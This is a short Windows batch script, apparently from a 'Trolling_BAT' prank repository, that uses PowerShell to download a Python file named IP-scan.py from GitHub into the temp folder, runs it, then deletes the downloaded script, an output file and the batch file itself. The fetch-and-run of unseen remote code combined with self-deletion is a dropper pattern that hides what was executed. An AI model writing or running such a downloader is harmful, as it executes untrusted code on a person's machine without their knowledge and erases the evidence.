@echo off
setlocal

set "URL=https://raw.githubusercontent.com/MangoTheSherlock/Trolling_BAT/main/IP-scan.py"
set "ZIELDATEI=%TEMP%\IP-scan.py"
set "OUTPUTDATEI=%TEMP%\output.txt"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%ZIELDATEI%')"

python "%ZIELDATEI%"

timeout /t 2 >nul

del "%ZIELDATEI%"
del "%OUTPUTDATEI%"
del "%~f0"

endlocal
